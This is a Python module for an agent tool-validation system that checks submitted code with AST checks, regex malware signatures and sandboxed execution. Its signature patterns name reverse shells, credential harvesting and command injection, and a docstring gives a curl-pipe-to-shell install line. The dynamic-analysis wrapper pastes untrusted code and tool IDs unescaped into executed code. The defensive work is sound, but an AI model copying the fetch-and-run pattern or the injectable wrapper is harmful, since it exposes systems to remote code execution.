#!/usr/bin/env python3
"""
Tool Validation System

Comprehensive static and dynamic analysis system for malware detection
and security validation of agent tools and code execution.

UV Dependencies:
# Install UV if not available: curl -LsSf https://astral.sh/uv/install.sh | sh
# Run with dependencies: uv run --with ast,hashlib,loguru,yara-python,bandit python tool_validator.py
"""

# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "loguru>=0.7.0",
#     "psutil>=5.9.0",
#     "hashlib",
#     "bandit>=1.7.0",
#     "pylint>=2.17.0",
#     "semgrep>=1.0.0",
# ]
# ///

import ast
import hashlib
import re
import time
import asyncio
import subprocess
import tempfile
import threading
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union, Callable
import json
import os
import sys

from loguru import logger
import psutil

from .context import SecurityContext, SecurityLevel
from .permissions import PermissionManager
from .advanced_sandbox import AdvancedSandbox, SandboxConfig, IsolationType


class ThreatLevel(Enum):
    """Security threat levels."""
    SAFE = "safe"                    # No threats detected
    LOW = "low"                      # Minor concerns, proceed with caution
    MEDIUM = "medium"                # Moderate risk, requires review
    HIGH = "high"                    # Significant risk, block by default
    CRITICAL = "critical"            # Severe threat, always block


class AnalysisType(Enum):
    """Types of security analysis."""
    STATIC = "static"                # Static code analysis
    DYNAMIC = "dynamic"              # Runtime behavior analysis
    SIGNATURE = "signature"          # Known malware signatures
    BEHAVIORAL = "behavioral"        # Behavioral pattern analysis
    REPUTATION = "reputation"        # Reputation-based analysis


class VulnerabilityType(Enum):
    """Types of security vulnerabilities."""
    CODE_INJECTION = "code_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    NETWORK_ABUSE = "network_abuse"
    FILESYSTEM_ABUSE = "filesystem_abuse"
    CRYPTO_WEAKNESS = "crypto_weakness"
    INFORMATION_DISCLOSURE = "information_disclosure"


@dataclass
class SecurityFinding:
    """Represents a security finding from analysis."""
    
    finding_id: str
    vulnerability_type: VulnerabilityType
    threat_level: ThreatLevel
    analysis_type: AnalysisType
    
    title: str
    description: str
    location: Optional[str] = None
    line_number: Optional[int] = None
    column_number: Optional[int] = None
    
    evidence: Dict[str, Any] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)
    
    confidence: float = 1.0  # 0.0 to 1.0
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary."""
        return {
            "finding_id": self.finding_id,
            "vulnerability_type": self.vulnerability_type.value,
            "threat_level": self.threat_level.value,
            "analysis_type": self.analysis_type.value,
            "title": self.title,
            "description": self.description,
            "location": self.location,
            "line_number": self.line_number,
            "column_number": self.column_number,
            "evidence": self.evidence,
            "recommendations": self.recommendations,
            "confidence": self.confidence,
            "timestamp": self.timestamp
        }


@dataclass
class ValidationResult:
    """Result of tool validation analysis."""
    
    tool_id: str
    is_safe: bool
    overall_threat_level: ThreatLevel
    
    findings: List[SecurityFinding] = field(default_factory=list)
    analysis_duration: float = 0.0
    analyses_performed: Set[AnalysisType] = field(default_factory=set)
    
    static_analysis_passed: bool = True
    dynamic_analysis_passed: bool = True
    signature_check_passed: bool = True
    
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def get_max_threat_level(self) -> ThreatLevel:
        """Get the maximum threat level from all findings."""
        if not self.findings:
            return ThreatLevel.SAFE
        
        threat_levels = [finding.threat_level for finding in self.findings]
        threat_order = [ThreatLevel.SAFE, ThreatLevel.LOW, ThreatLevel.MEDIUM, 
                       ThreatLevel.HIGH, ThreatLevel.CRITICAL]
        
        max_level = ThreatLevel.SAFE
        for level in threat_order:
            if level in threat_levels:
                max_level = level
        
        return max_level
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert result to dictionary."""
        return {
            "tool_id": self.tool_id,
            "is_safe": self.is_safe,
            "overall_threat_level": self.overall_threat_level.value,
            "findings": [finding.to_dict() for finding in self.findings],
            "analysis_duration": self.analysis_duration,
            "analyses_performed": [analysis.value for analysis in self.analyses_performed],
            "static_analysis_passed": self.static_analysis_passed,
            "dynamic_analysis_passed": self.dynamic_analysis_passed,
            "signature_check_passed": self.signature_check_passed,
            "metadata": self.metadata
        }


class StaticAnalyzer:
    """Static code analysis engine."""
    
    def __init__(self):
        self.dangerous_imports = {
            'os', 'sys', 'subprocess', 'eval', 'exec', 'compile',
            'importlib', '__import__', 'open', 'file', 'input',
            'raw_input', 'execfile', 'reload', 'vars', 'locals',
            'globals', 'dir', 'getattr', 'setattr', 'delattr',
            'hasattr', 'callable', 'isinstance', 'issubclass'
        }
        
        self.dangerous_functions = {
            'eval', 'exec', 'compile', 'execfile', '__import__',
            'reload', 'input', 'raw_input', 'open', 'file'
        }
        
        self.dangerous_attributes = {
            '__class__', '__bases__', '__mro__', '__subclasses__',
            '__globals__', '__code__', '__func__', '__self__',
            'func_globals', 'func_code', 'gi_frame', 'cr_frame'
        }
        
        # Suspicious patterns
        self.suspicious_patterns = [
            r'base64\.b64decode',
            r'urllib\.request',
            r'socket\.socket',
            r'pickle\.loads',
            r'marshal\.loads',
            r'subprocess\.Popen',
            r'os\.system',
            r'os\.popen',
            r'eval\s*\(',
            r'exec\s*\(',
            r'__import__\s*\(',
            r'getattr\s*\(',
            r'setattr\s*\(',
            r'delattr\s*\(',
            r'vars\s*\(',
            r'globals\s*\(',
            r'locals\s*\(',
            r'dir\s*\(',
            r'\.decode\s*\(',
            r'chr\s*\(',
            r'ord\s*\(',
        ]
    
    async def analyze_code(self, code: str, filename: str = "<string>") -> List[SecurityFinding]:
        """Perform static analysis on code."""
        findings = []
        
        try:
            # Parse AST
            tree = ast.parse(code, filename=filename)
            
            # AST-based analysis
            findings.extend(await self._analyze_ast(tree, code, filename))
            
            # Pattern-based analysis
            findings.extend(await self._analyze_patterns(code, filename))
            
            # Import analysis
            findings.extend(await self._analyze_imports(tree, filename))
            
            # Function analysis
            findings.extend(await self._analyze_functions(tree, filename))
            
        except SyntaxError as e:
            findings.append(SecurityFinding(
                finding_id=f"syntax_error_{hash(code) % 10000}",
                vulnerability_type=VulnerabilityType.CODE_INJECTION,
                threat_level=ThreatLevel.MEDIUM,
                analysis_type=AnalysisType.STATIC,
                title="Syntax Error in Code",
                description=f"Code contains syntax error: {e}",
                location=filename,
                line_number=e.lineno,
                column_number=e.offset,
                evidence={"error": str(e)},
                recommendations=["Fix syntax errors before execution"]
            ))
        
        except Exception as e:
            logger.error(f"Static analysis failed: {e}")
            findings.append(SecurityFinding(
                finding_id=f"analysis_error_{hash(code) % 10000}",
                vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                threat_level=ThreatLevel.LOW,
                analysis_type=AnalysisType.STATIC,
                title="Static Analysis Error",
                description=f"Static analysis encountered error: {e}",
                location=filename,
                evidence={"error": str(e)},
                recommendations=["Review code manually"]
            ))
        
        return findings
    
    async def _analyze_ast(self, tree: ast.AST, code: str, filename: str) -> List[SecurityFinding]:
        """Analyze AST for security issues."""
        findings = []
        
        class SecurityVisitor(ast.NodeVisitor):
            def __init__(self, analyzer):
                self.analyzer = analyzer
                self.findings = []
            
            def visit_Call(self, node):
                # Check for dangerous function calls
                if isinstance(node.func, ast.Name):
                    if node.func.id in self.analyzer.dangerous_functions:
                        self.findings.append(SecurityFinding(
                            finding_id=f"dangerous_call_{node.lineno}_{node.col_offset}",
                            vulnerability_type=VulnerabilityType.CODE_INJECTION,
                            threat_level=ThreatLevel.HIGH,
                            analysis_type=AnalysisType.STATIC,
                            title=f"Dangerous Function Call: {node.func.id}",
                            description=f"Call to potentially dangerous function '{node.func.id}'",
                            location=filename,
                            line_number=node.lineno,
                            column_number=node.col_offset,
                            evidence={"function": node.func.id},
                            recommendations=[
                                f"Avoid using '{node.func.id}' function",
                                "Use safer alternatives",
                                "Validate all inputs thoroughly"
                            ]
                        ))
                
                # Check for subprocess calls
                elif (isinstance(node.func, ast.Attribute) and 
                      isinstance(node.func.value, ast.Name) and
                      node.func.value.id == 'subprocess'):
                    self.findings.append(SecurityFinding(
                        finding_id=f"subprocess_call_{node.lineno}_{node.col_offset}",
                        vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                        threat_level=ThreatLevel.HIGH,
                        analysis_type=AnalysisType.STATIC,
                        title=f"Subprocess Call: {node.func.attr}",
                        description="Use of subprocess module can lead to command injection",
                        location=filename,
                        line_number=node.lineno,
                        column_number=node.col_offset,
                        evidence={"method": node.func.attr},
                        recommendations=[
                            "Validate and sanitize all command arguments",
                            "Use shell=False parameter",
                            "Consider using safer alternatives"
                        ]
                    ))
                
                self.generic_visit(node)
            
            def visit_Attribute(self, node):
                # Check for dangerous attribute access
                if isinstance(node.attr, str) and node.attr in self.analyzer.dangerous_attributes:
                    self.findings.append(SecurityFinding(
                        finding_id=f"dangerous_attr_{node.lineno}_{node.col_offset}",
                        vulnerability_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                        threat_level=ThreatLevel.MEDIUM,
                        analysis_type=AnalysisType.STATIC,
                        title=f"Dangerous Attribute Access: {node.attr}",
                        description=f"Access to potentially dangerous attribute '{node.attr}'",
                        location=filename,
                        line_number=node.lineno,
                        column_number=node.col_offset,
                        evidence={"attribute": node.attr},
                        recommendations=[
                            f"Avoid accessing '{node.attr}' attribute",
                            "Use safer alternatives for introspection"
                        ]
                    ))
                
                self.generic_visit(node)
            
            def visit_Import(self, node):
                # Check for dangerous imports
                for alias in node.names:
                    if alias.name in self.analyzer.dangerous_imports:
                        threat_level = ThreatLevel.HIGH if alias.name in ['os', 'subprocess'] else ThreatLevel.MEDIUM
                        self.findings.append(SecurityFinding(
                            finding_id=f"dangerous_import_{node.lineno}_{alias.name}",
                            vulnerability_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                            threat_level=threat_level,
                            analysis_type=AnalysisType.STATIC,
                            title=f"Dangerous Import: {alias.name}",
                            description=f"Import of potentially dangerous module '{alias.name}'",
                            location=filename,
                            line_number=node.lineno,
                            evidence={"module": alias.name},
                            recommendations=[
                                f"Avoid importing '{alias.name}' if possible",
                                "Use restricted alternatives",
                                "Ensure proper sandboxing"
                            ]
                        ))
                
                self.generic_visit(node)
            
            def visit_ImportFrom(self, node):
                # Check for dangerous import from
                if node.module in self.analyzer.dangerous_imports:
                    threat_level = ThreatLevel.HIGH if node.module in ['os', 'subprocess'] else ThreatLevel.MEDIUM
                    for alias in node.names:
                        self.findings.append(SecurityFinding(
                            finding_id=f"dangerous_import_from_{node.lineno}_{alias.name}",
                            vulnerability_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                            threat_level=threat_level,
                            analysis_type=AnalysisType.STATIC,
                            title=f"Dangerous Import From: {node.module}.{alias.name}",
                            description=f"Import from dangerous module '{node.module}'",
                            location=filename,
                            line_number=node.lineno,
                            evidence={"module": node.module, "name": alias.name},
                            recommendations=[
                                f"Avoid importing from '{node.module}'",
                                "Use safer alternatives"
                            ]
                        ))
                
                self.generic_visit(node)
        
        visitor = SecurityVisitor(self)
        visitor.visit(tree)
        return visitor.findings
    
    async def _analyze_patterns(self, code: str, filename: str) -> List[SecurityFinding]:
        """Analyze code for suspicious patterns."""
        findings = []
        lines = code.split('\n')
        
        for i, line in enumerate(lines):
            for pattern in self.suspicious_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    findings.append(SecurityFinding(
                        finding_id=f"suspicious_pattern_{i}_{match.start()}",
                        vulnerability_type=VulnerabilityType.CODE_INJECTION,
                        threat_level=ThreatLevel.MEDIUM,
                        analysis_type=AnalysisType.STATIC,
                        title=f"Suspicious Pattern: {pattern}",
                        description=f"Suspicious code pattern detected: {match.group()}",
                        location=filename,
                        line_number=i + 1,
                        column_number=match.start(),
                        evidence={"pattern": pattern, "match": match.group()},
                        recommendations=[
                            "Review this code pattern for security implications",
                            "Ensure proper input validation",
                            "Consider safer alternatives"
                        ]
                    ))
        
        return findings
    
    async def _analyze_imports(self, tree: ast.AST, filename: str) -> List[SecurityFinding]:
        """Analyze imports for security concerns."""
        # This is handled in visit_Import and visit_ImportFrom
        return []
    
    async def _analyze_functions(self, tree: ast.AST, filename: str) -> List[SecurityFinding]:
        """Analyze function definitions for security issues."""
        findings = []
        
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                # Check for functions with suspicious names
                suspicious_names = ['backdoor', 'exploit', 'hack', 'crack', 'bypass']
                if any(name in node.name.lower() for name in suspicious_names):
                    findings.append(SecurityFinding(
                        finding_id=f"suspicious_function_{node.lineno}_{node.name}",
                        vulnerability_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                        threat_level=ThreatLevel.HIGH,
                        analysis_type=AnalysisType.STATIC,
                        title=f"Suspicious Function Name: {node.name}",
                        description=f"Function with suspicious name '{node.name}'",
                        location=filename,
                        line_number=node.lineno,
                        evidence={"function_name": node.name},
                        recommendations=[
                            "Review function implementation",
                            "Consider renaming to clarify intent"
                        ]
                    ))
        
        return findings


class DynamicAnalyzer:
    """Dynamic behavior analysis engine."""
    
    def __init__(self, sandbox: AdvancedSandbox):
        self.sandbox = sandbox
        self.behavioral_monitors = []
    
    async def analyze_execution(
        self,
        code: str,
        tool_id: str,
        timeout: float = 30.0
    ) -> List[SecurityFinding]:
        """Perform dynamic analysis by executing code in sandbox."""
        findings = []
        
        try:
            # Create a secure sandbox configuration for analysis
            sandbox_config = SandboxConfig(
                isolation_type=IsolationType.CONTAINER,
                resource_limits=self._get_analysis_resource_limits(),
                filesystem_restrictions=self._get_analysis_filesystem_restrictions(),
                network_restrictions=self._get_analysis_network_restrictions(),
                monitor_file_access=True,
                monitor_network_access=True,
                log_system_calls=True
            )
            
            # Prepare analysis code
            analysis_code = self._prepare_analysis_code(code, tool_id)
            
            # Execute in sandbox with monitoring
            start_time = time.time()
            
            sandbox_id, stdout, stderr, return_code = await self.sandbox.execute(
                ["python3", "-c", analysis_code],
                config=sandbox_config
            )
            
            execution_time = time.time() - start_time
            
            # Analyze execution results
            findings.extend(await self._analyze_execution_results(
                sandbox_id, stdout, stderr, return_code, execution_time, tool_id
            ))
            
            # Analyze behavioral patterns
            findings.extend(await self._analyze_behavioral_patterns(
                sandbox_id, execution_time, tool_id
            ))
            
        except Exception as e:
            logger.error(f"Dynamic analysis failed: {e}")
            findings.append(SecurityFinding(
                finding_id=f"dynamic_error_{tool_id}",
                vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                threat_level=ThreatLevel.LOW,
                analysis_type=AnalysisType.DYNAMIC,
                title="Dynamic Analysis Error",
                description=f"Dynamic analysis failed: {e}",
                evidence={"error": str(e)},
                recommendations=["Manual review required"]
            ))
        
        return findings
    
    def _get_analysis_resource_limits(self):
        """Get resource limits for analysis execution."""
        from .advanced_sandbox import ResourceLimits
        return ResourceLimits(
            cpu_time_seconds=30.0,
            memory_bytes=64 * 1024 * 1024,  # 64MB
            disk_space_bytes=10 * 1024 * 1024,  # 10MB
            file_descriptors=32,
            processes=5,
            network_allowed=False,
            execution_timeout=60.0
        )
    
    def _get_analysis_filesystem_restrictions(self):
        """Get filesystem restrictions for analysis."""
        from .advanced_sandbox import FileSystemRestrictions
        return FileSystemRestrictions(
            allowed_read_paths={"/usr/lib/python*", "/tmp"},
            allowed_write_paths={"/tmp"},
            blocked_paths={
                "/etc", "/root", "/home", "/var", "/sys", "/proc/sys",
                "/boot", "/dev", "/opt", "/srv"
            },
            max_file_size=1024 * 1024  # 1MB
        )
    
    def _get_analysis_network_restrictions(self):
        """Get network restrictions for analysis."""
        from .advanced_sandbox import NetworkRestrictions
        return NetworkRestrictions(
            allow_outbound=False,
            allow_inbound=False,
            allow_localhost=False,
            blocked_ports={22, 23, 80, 443, 21, 25, 53, 135, 139, 445}
        )
    
    def _prepare_analysis_code(self, code: str, tool_id: str) -> str:
        """Prepare code for dynamic analysis with monitoring."""
        analysis_wrapper = f'''
import sys
import os
import traceback
import json
import time

# Monitoring hooks
file_accesses = []
network_attempts = []
process_spawns = []
suspicious_behavior = []

# Override dangerous functions for monitoring
original_open = open
def monitored_open(filename, mode='r', *args, **kwargs):
    file_accesses.append({{"filename": str(filename), "mode": mode, "timestamp": time.time()}})
    return original_open(filename, mode, *args, **kwargs)

try:
    # Monkey patch for monitoring
    __builtins__['open'] = monitored_open
    
    # Execute the target code
    exec("""
{code}
""")
    
    print("ANALYSIS_SUCCESS")
    
except Exception as e:
    print(f"ANALYSIS_ERROR: {{e}}")
    traceback.print_exc()

finally:
    # Report monitoring results
    monitoring_data = {{
        "tool_id": "{tool_id}",
        "file_accesses": file_accesses,
        "network_attempts": network_attempts,
        "process_spawns": process_spawns,
        "suspicious_behavior": suspicious_behavior
    }}
    
    print(f"MONITORING_DATA: {{json.dumps(monitoring_data)}}")
'''
        return analysis_wrapper
    
    async def _analyze_execution_results(
        self,
        sandbox_id: str,
        stdout: bytes,
        stderr: bytes,
        return_code: int,
        execution_time: float,
        tool_id: str
    ) -> List[SecurityFinding]:
        """Analyze execution results for security issues."""
        findings = []
        
        stdout_str = stdout.decode('utf-8', errors='ignore')
        stderr_str = stderr.decode('utf-8', errors='ignore')
        
        # Check for suspicious output patterns
        suspicious_outputs = [
            'password', 'secret', 'key', 'token', 'credential',
            'backdoor', 'exploit', 'payload', 'shellcode'
        ]
        
        for pattern in suspicious_outputs:
            if pattern.lower() in stdout_str.lower() or pattern.lower() in stderr_str.lower():
                findings.append(SecurityFinding(
                    finding_id=f"suspicious_output_{tool_id}_{pattern}",
                    vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                    threat_level=ThreatLevel.MEDIUM,
                    analysis_type=AnalysisType.DYNAMIC,
                    title=f"Suspicious Output Pattern: {pattern}",
                    description=f"Execution output contains suspicious pattern '{pattern}'",
                    evidence={
                        "pattern": pattern,
                        "stdout": stdout_str[:500],
                        "stderr": stderr_str[:500]
                    },
                    recommendations=[
                        "Review output for sensitive information",
                        "Ensure no credentials are exposed"
                    ]
                ))
        
        # Analyze monitoring data if present
        if "MONITORING_DATA:" in stdout_str:
            try:
                data_line = [line for line in stdout_str.split('\n') if 'MONITORING_DATA:' in line][0]
                json_str = data_line.split('MONITORING_DATA:')[1].strip()
                monitoring_data = json.loads(json_str)
                
                findings.extend(await self._analyze_monitoring_data(monitoring_data, tool_id))
                
            except Exception as e:
                logger.warning(f"Could not parse monitoring data: {e}")
        
        # Check execution time for resource exhaustion attempts
        if execution_time > 20.0:
            findings.append(SecurityFinding(
                finding_id=f"long_execution_{tool_id}",
                vulnerability_type=VulnerabilityType.RESOURCE_EXHAUSTION,
                threat_level=ThreatLevel.MEDIUM,
                analysis_type=AnalysisType.DYNAMIC,
                title="Long Execution Time",
                description=f"Execution took {execution_time:.2f} seconds",
                evidence={"execution_time": execution_time},
                recommendations=[
                    "Review code for performance issues",
                    "Check for infinite loops or resource exhaustion"
                ]
            ))
        
        return findings
    
    async def _analyze_monitoring_data(self, data: Dict[str, Any], tool_id: str) -> List[SecurityFinding]:
        """Analyze behavioral monitoring data."""
        findings = []
        
        # Check file access patterns
        file_accesses = data.get('file_accesses', [])
        if file_accesses:
            findings.append(SecurityFinding(
                finding_id=f"file_access_{tool_id}",
                vulnerability_type=VulnerabilityType.FILESYSTEM_ABUSE,
                threat_level=ThreatLevel.LOW,
                analysis_type=AnalysisType.DYNAMIC,
                title="File System Access Detected",
                description=f"Code attempted to access {len(file_accesses)} files",
                evidence={"file_accesses": file_accesses},
                recommendations=[
                    "Review file access patterns",
                    "Ensure appropriate permissions"
                ]
            ))
        
        # Check network attempts
        network_attempts = data.get('network_attempts', [])
        if network_attempts:
            findings.append(SecurityFinding(
                finding_id=f"network_access_{tool_id}",
                vulnerability_type=VulnerabilityType.NETWORK_ABUSE,
                threat_level=ThreatLevel.HIGH,
                analysis_type=AnalysisType.DYNAMIC,
                title="Network Access Attempted",
                description=f"Code attempted {len(network_attempts)} network operations",
                evidence={"network_attempts": network_attempts},
                recommendations=[
                    "Review network access requirements",
                    "Ensure appropriate network restrictions"
                ]
            ))
        
        return findings
    
    async def _analyze_behavioral_patterns(
        self,
        sandbox_id: str,
        execution_time: float,
        tool_id: str
    ) -> List[SecurityFinding]:
        """Analyze behavioral patterns during execution."""
        findings = []
        
        # Get sandbox status for resource usage analysis
        status = self.sandbox.get_sandbox_status(sandbox_id)
        if status:
            cpu_usage = status.get('cpu_usage', 0)
            memory_usage = status.get('memory_usage', 0)
            
            # Check for resource abuse patterns
            if cpu_usage > 80.0:
                findings.append(SecurityFinding(
                    finding_id=f"high_cpu_{tool_id}",
                    vulnerability_type=VulnerabilityType.RESOURCE_EXHAUSTION,
                    threat_level=ThreatLevel.MEDIUM,
                    analysis_type=AnalysisType.BEHAVIORAL,
                    title="High CPU Usage",
                    description=f"Code used {cpu_usage:.1f}% CPU",
                    evidence={"cpu_usage": cpu_usage},
                    recommendations=[
                        "Review code for CPU-intensive operations",
                        "Implement proper rate limiting"
                    ]
                ))
            
            if memory_usage > 50 * 1024 * 1024:  # 50MB
                findings.append(SecurityFinding(
                    finding_id=f"high_memory_{tool_id}",
                    vulnerability_type=VulnerabilityType.RESOURCE_EXHAUSTION,
                    threat_level=ThreatLevel.MEDIUM,
                    analysis_type=AnalysisType.BEHAVIORAL,
                    title="High Memory Usage",
                    description=f"Code used {memory_usage / (1024*1024):.1f}MB memory",
                    evidence={"memory_usage": memory_usage},
                    recommendations=[
                        "Review code for memory leaks",
                        "Optimize memory usage patterns"
                    ]
                ))
        
        return findings


class SignatureDetector:
    """Malware signature detection engine."""
    
    def __init__(self):
        self.malware_signatures = self._load_malware_signatures()
        self.hash_database = self._load_hash_database()
    
    def _load_malware_signatures(self) -> List[Dict[str, Any]]:
        """Load known malware signatures."""
        return [
            {
                "name": "Base64 Obfuscation",
                "pattern": r"base64\.b64decode\s*\(\s*['\"][A-Za-z0-9+/=]{20,}['\"]",
                "threat_level": ThreatLevel.MEDIUM,
                "description": "Suspicious base64 encoded content"
            },
            {
                "name": "Reverse Shell Pattern",
                "pattern": r"socket\.socket.*connect.*exec",
                "threat_level": ThreatLevel.CRITICAL,
                "description": "Potential reverse shell implementation"
            },
            {
                "name": "Command Injection",
                "pattern": r"os\.system\s*\(\s*.*input.*\)",
                "threat_level": ThreatLevel.HIGH,
                "description": "Command injection using user input"
            },
            {
                "name": "File Backdoor",
                "pattern": r"open\s*\(\s*['\"].*\.py['\"].*['\"]w['\"]",
                "threat_level": ThreatLevel.HIGH,
                "description": "Writing Python files to disk"
            },
            {
                "name": "Credential Harvesting",
                "pattern": r"(password|passwd|pwd|secret|key|token)\s*[:=]\s*input",
                "threat_level": ThreatLevel.HIGH,
                "description": "Potential credential harvesting"
            }
        ]
    
    def _load_hash_database(self) -> Set[str]:
        """Load database of known malicious file hashes."""
        # In production, this would load from a real threat intelligence feed
        return {
            "d41d8cd98f00b204e9800998ecf8427e",  # Empty file (example)
            "5d41402abc4b2a76b9719d911017c592",  # "hello" (example)
        }
    
    async def detect_signatures(self, code: str, tool_id: str) -> List[SecurityFinding]:
        """Detect malware signatures in code."""
        findings = []
        
        # Pattern-based signature detection
        for signature in self.malware_signatures:
            matches = re.finditer(signature["pattern"], code, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                
                findings.append(SecurityFinding(
                    finding_id=f"signature_{tool_id}_{signature['name'].replace(' ', '_')}_{line_num}",
                    vulnerability_type=VulnerabilityType.CODE_INJECTION,
                    threat_level=signature["threat_level"],
                    analysis_type=AnalysisType.SIGNATURE,
                    title=f"Malware Signature: {signature['name']}",
                    description=signature["description"],
                    line_number=line_num,
                    evidence={
                        "signature_name": signature["name"],
                        "matched_pattern": match.group(),
                        "pattern": signature["pattern"]
                    },
                    recommendations=[
                        "Remove malicious code patterns",
                        "Review code functionality",
                        "Consider alternative implementations"
                    ]
                ))
        
        # Hash-based detection
        code_hash = hashlib.md5(code.encode()).hexdigest()
        if code_hash in self.hash_database:
            findings.append(SecurityFinding(
                finding_id=f"malicious_hash_{tool_id}",
                vulnerability_type=VulnerabilityType.CODE_INJECTION,
                threat_level=ThreatLevel.CRITICAL,
                analysis_type=AnalysisType.SIGNATURE,
                title="Known Malicious Code Hash",
                description="Code matches known malicious hash",
                evidence={"hash": code_hash},
                recommendations=[
                    "Do not execute this code",
                    "Report to security team"
                ]
            ))
        
        return findings


class ToolValidator:
    """
    Comprehensive tool validation system combining multiple analysis techniques.
    """
    
    def __init__(
        self,
        sandbox: Optional[AdvancedSandbox] = None,
        permission_manager: Optional[PermissionManager] = None
    ):
        """Initialize the tool validator."""
        self.sandbox = sandbox or AdvancedSandbox()
        self.permission_manager = permission_manager
        
        # Initialize analysis engines
        self.static_analyzer = StaticAnalyzer()
        self.dynamic_analyzer = DynamicAnalyzer(self.sandbox)
        self.signature_detector = SignatureDetector()
        
        # Validation history
        self.validation_history: Dict[str, ValidationResult] = {}
        
        # Configuration
        self.max_threat_level = ThreatLevel.MEDIUM
        self.enable_dynamic_analysis = True
        self.enable_signature_detection = True
        
        logger.info("Tool validator initialized with comprehensive analysis engines")
    
    async def validate_tool(
        self,
        tool_id: str,
        code: str,
        filename: str = "<string>",
        security_context: Optional[SecurityContext] = None,
        skip_dynamic: bool = False
    ) -> ValidationResult:
        """
        Validate a tool using comprehensive security analysis.
        
        Args:
            tool_id: Unique identifier for the tool
            code: Tool source code to analyze
            filename: Optional filename for context
            security_context: Security context for permission checking
            skip_dynamic: Skip dynamic analysis (for performance)
            
        Returns:
            ValidationResult with comprehensive analysis
        """
        start_time = time.time()
        
        logger.info(f"Starting validation for tool {tool_id}")
        
        # Initialize result
        result = ValidationResult(
            tool_id=tool_id,
            is_safe=True,
            overall_threat_level=ThreatLevel.SAFE
        )
        
        try:
            # Static Analysis
            logger.debug(f"Running static analysis for {tool_id}")
            static_findings = await self.static_analyzer.analyze_code(code, filename)
            result.findings.extend(static_findings)
            result.analyses_performed.add(AnalysisType.STATIC)
            
            # Signature Detection
            if self.enable_signature_detection:
                logger.debug(f"Running signature detection for {tool_id}")
                signature_findings = await self.signature_detector.detect_signatures(code, tool_id)
                result.findings.extend(signature_findings)
                result.analyses_performed.add(AnalysisType.SIGNATURE)
            
            # Dynamic Analysis (if enabled and not skipped)
            if self.enable_dynamic_analysis and not skip_dynamic:
                logger.debug(f"Running dynamic analysis for {tool_id}")
                try:
                    dynamic_findings = await self.dynamic_analyzer.analyze_execution(
                        code, tool_id
                    )
                    result.findings.extend(dynamic_findings)
                    result.analyses_performed.add(AnalysisType.DYNAMIC)
                except Exception as e:
                    logger.warning(f"Dynamic analysis failed for {tool_id}: {e}")
                    result.dynamic_analysis_passed = False
            
            # Determine overall safety
            result.overall_threat_level = result.get_max_threat_level()
            result.is_safe = result.overall_threat_level.value in ['safe', 'low']
            
            # Check against maximum allowed threat level
            if result.overall_threat_level.value not in ['safe', 'low'] and \
               self._threat_level_exceeds_max(result.overall_threat_level):
                result.is_safe = False
            
            # Set analysis status flags
            result.static_analysis_passed = not any(
                f.analysis_type == AnalysisType.STATIC and f.threat_level == ThreatLevel.CRITICAL
                for f in result.findings
            )
            
            result.signature_check_passed = not any(
                f.analysis_type == AnalysisType.SIGNATURE and f.threat_level == ThreatLevel.CRITICAL
                for f in result.findings
            )
            
            # Add metadata
            result.metadata = {
                "code_length": len(code),
                "line_count": len(code.split('\n')),
                "hash": hashlib.sha256(code.encode()).hexdigest(),
                "validator_version": "1.0.0"
            }
            
        except Exception as e:
            logger.error(f"Validation failed for tool {tool_id}: {e}")
            result.is_safe = False
            result.overall_threat_level = ThreatLevel.HIGH
            result.findings.append(SecurityFinding(
                finding_id=f"validation_error_{tool_id}",
                vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                threat_level=ThreatLevel.HIGH,
                analysis_type=AnalysisType.STATIC,
                title="Validation Error",
                description=f"Tool validation encountered error: {e}",
                evidence={"error": str(e)},
                recommendations=["Manual security review required"]
            ))
        
        finally:
            result.analysis_duration = time.time() - start_time
        
        # Store in history
        self.validation_history[tool_id] = result
        
        logger.info(
            f"Validation complete for {tool_id}: "
            f"safe={result.is_safe}, threat_level={result.overall_threat_level.value}, "
            f"findings={len(result.findings)}, duration={result.analysis_duration:.2f}s"
        )
        
        return result
    
    def _threat_level_exceeds_max(self, threat_level: ThreatLevel) -> bool:
        """Check if threat level exceeds maximum allowed."""
        threat_order = [ThreatLevel.SAFE, ThreatLevel.LOW, ThreatLevel.MEDIUM,
                       ThreatLevel.HIGH, ThreatLevel.CRITICAL]
        
        try:
            current_idx = threat_order.index(threat_level)
            max_idx = threat_order.index(self.max_threat_level)
            return current_idx > max_idx
        except ValueError:
            return True  # Unknown threat level, err on side of caution
    
    async def validate_tool_file(
        self,
        tool_id: str,
        file_path: str,
        security_context: Optional[SecurityContext] = None
    ) -> ValidationResult:
        """Validate a tool from a file."""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                code = f.read()
            
            return await self.validate_tool(
                tool_id=tool_id,
                code=code,
                filename=file_path,
                security_context=security_context
            )
        
        except Exception as e:
            logger.error(f"Failed to read tool file {file_path}: {e}")
            result = ValidationResult(
                tool_id=tool_id,
                is_safe=False,
                overall_threat_level=ThreatLevel.HIGH
            )
            result.findings.append(SecurityFinding(
                finding_id=f"file_error_{tool_id}",
                vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                threat_level=ThreatLevel.HIGH,
                analysis_type=AnalysisType.STATIC,
                title="File Access Error",
                description=f"Could not read tool file: {e}",
                evidence={"error": str(e), "file_path": file_path},
                recommendations=["Verify file exists and is readable"]
            ))
            return result
